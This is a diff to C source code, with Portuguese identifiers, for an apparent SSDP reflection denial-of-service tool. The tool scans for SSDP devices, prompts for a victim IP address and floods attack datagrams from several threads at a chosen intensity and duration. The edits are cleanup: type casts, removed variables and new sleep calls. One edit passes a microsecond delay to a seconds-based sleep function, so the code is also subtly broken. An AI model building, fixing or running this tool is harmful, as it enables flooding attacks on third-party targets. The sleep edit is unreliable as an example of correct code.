@@ -10,8 +10,10 @@
 */
 #include "ssdpLib.h"
 #include "common/netio.h"
+#include "common/timeHelper.h"
 #include "venus.h"
 #include "listssdp.h"
+#include "math.h"
 #include <pthread.h>
 
 
@@ -23,7 +25,6 @@ void* multicast_m_search_SSDP(void* arg) {
     struct sockaddr_in socket_out, socket_in; 
     int size_socket_in, my_socket;
     char msg_recebida[576];
-    char* recved_ip;
     listDispositivoSSDP* dispTemp;
 
     my_socket = socket(PF_INET, SOCK_DGRAM, 0); 
@@ -49,7 +50,7 @@ void* multicast_m_search_SSDP(void* arg) {
     
     while(1){
 
-        recvfrom(my_socket, msg_recebida, 576, MSG_WAITALL, (struct sockaddr*)&socket_in, &size_socket_in);
+        recvfrom(my_socket, msg_recebida, 576, MSG_WAITALL, (struct sockaddr*)&socket_in, (unsigned int *)&size_socket_in);
         if(verificaSePossuiIP(listaDispositivos, inet_ntoa(socket_in.sin_addr)) == 0){
             
             printf("Obteve novo endereco ip: %s\n", inet_ntoa(socket_in.sin_addr));
@@ -107,7 +108,7 @@ void* multicast_escuta_meio_SSDP(void* arg) {
     printf("Escutando o meio...\n");
     while(1){
 
-        msg_size = recvfrom(my_socket, msg_recebida, 576, MSG_WAITALL, (struct sockaddr*)&socket_in, &size_socket_in);
+        msg_size = recvfrom(my_socket, msg_recebida, 576, MSG_WAITALL, (struct sockaddr*)&socket_in, (unsigned int *)&size_socket_in);
 
         if(msg_size < 0){
             printf("ERROR in recvfrom\n");
@@ -143,8 +144,8 @@ void pesquisarDispositivosSSDP(listDispositivoSSDP* listaDispositivos){
     pthread_t thread_m_search_multicast;
 
     pthread_create(&thread_m_search_multicast, NULL, multicast_m_search_SSDP, listaDispositivos);
-    sleep(5);
-	pthread_cancel(thread_m_search_multicast);
+    SleepSec(5);
+    pthread_cancel(thread_m_search_multicast);
 
     /**
     printf("\n################################\n");
@@ -154,8 +155,8 @@ void pesquisarDispositivosSSDP(listDispositivoSSDP* listaDispositivos){
 
     pthread_create(&thread_m_search_multicast, NULL, multicast_escuta_meio_SSDP, listaDispositivos);
     //sleep(90);  // Verificar por quanto tempo deixo esse sleep.
-    sleep(10);
-	pthread_cancel(thread_m_search_multicast);
+    SleepSec(10);
+    pthread_cancel(thread_m_search_multicast);
 }
 
 pacoteAtaque* montaPacketAttackSSDP(configuracaoAtaque* configuracao){
@@ -234,9 +235,8 @@ configuracaoAtaque* configurarAttackSSDP(listDispositivoSSDP* listaDispositivos)
     dispositivoSSDP* dispositivoAlvoTeste = NULL;
     configuracaoAtaque* config = NULL;
 
-    int posicaoRefletor, posicaoAlvo, tamanhoDatagrama, tamanhoMsgEnvio;
+    int posicaoAlvo;
     int intensidadeDoAttack, tempoAtaque;
-    char* datagram;
     char enderecoAlvo [14];
 
     dispositivoAlvoTeste = malloc(sizeof(dispositivoSSDP));
@@ -290,7 +290,7 @@ configuracaoAtaque* configurarAttackSSDP(listDispositivoSSDP* listaDispositivos)
     }
 
     printf("Informe o endereço ip do alvo:\n");
-    scanf("%s", &enderecoAlvo);
+    scanf("%s", enderecoAlvo);
     dispositivoAlvoTeste =  criaDispositivo(enderecoAlvo, STATUS_DISP_ALVO, 0);
 
 
@@ -377,7 +377,7 @@ void* realizaAtaque(void* arg){
     int retorno;
 
     pacoteThread* pckThread = (pacoteThread*)arg;
-    int quantMaxPacotes = pow(10, (pckThread->config->intensidadeDoAttack - 1));
+    double quantMaxPacotes = pow(10, (pckThread->config->intensidadeDoAttack - 1));
     float tempoEsperaPorPacote = pckThread->quantThreads*(pow(10,6)/quantMaxPacotes);
 
     while(1){
@@ -385,7 +385,7 @@ void* realizaAtaque(void* arg){
         retorno = sendto(pckThread->sck, pckThread->pckAttack->datagrama, (size_t)(pckThread->pckAttack->datagramaSize), 0, (struct sockaddr*) &(pckThread->pckAttack->sin), sizeof(pckThread->pckAttack->sin));
         if ( retorno < 0)
             printf("\n\nErro ao enviar a mensagem. Erro: %d\n", retorno);
-        usleep(tempoEsperaPorPacote); // sleep for 0.1 second.
+        SleepSec(tempoEsperaPorPacote); // sleep for 0.1 second.
         //sleep(1.0/quantMaxPacotes);
         //sleep(0.1);
         pckThread->quantPacotesEnviados = pckThread->quantPacotesEnviados + 1;
@@ -405,17 +405,14 @@ int iniciaAtaqueSSDP(configuracaoAtaque* configuracao, pacoteAtaque* pckAttack, 
     int nthread;
     int scks[quantThreads];
     pthread_t threadsAttack[quantThreads];
-    int quantMaxPacotes = pow(10, (configuracao->intensidadeDoAttack - 1));
-    int quantTotalPacotesEnviados = 0;
 
     // -------------------------------------------------------------------------------------
     pthread_attr_t tattr;
     struct sched_param param;
-    int ret;
-    ret = pthread_attr_init(&tattr);
-    ret = pthread_attr_getschedparam (&tattr, &param);
+    pthread_attr_init(&tattr);
+    pthread_attr_getschedparam (&tattr, &param);
     param.sched_priority = 1;  // definindo nova prioridade.
-    ret = pthread_attr_setschedparam (&tattr, &param);
+    pthread_attr_setschedparam (&tattr, &param);
     // -------------------------------------------------------------------------------------
 
     for(nthread = 0; nthread < quantThreads; nthread++ ){
@@ -430,7 +427,7 @@ int iniciaAtaqueSSDP(configuracaoAtaque* configuracao, pacoteAtaque* pckAttack, 
         //pthread_create(&threadsAttack[nthread], &tattr, realizaAtaque, pckThread[nthread]);
         pthread_create(&threadsAttack[nthread], NULL, realizaAtaque, pckThread[nthread]);
     }
-    sleep(configuracao->tempoAtaque);
+    SleepSec(configuracao->tempoAtaque);
     for( nthread = 0; nthread < quantThreads; nthread++ ){
         pthread_cancel(threadsAttack[nthread]);
     }
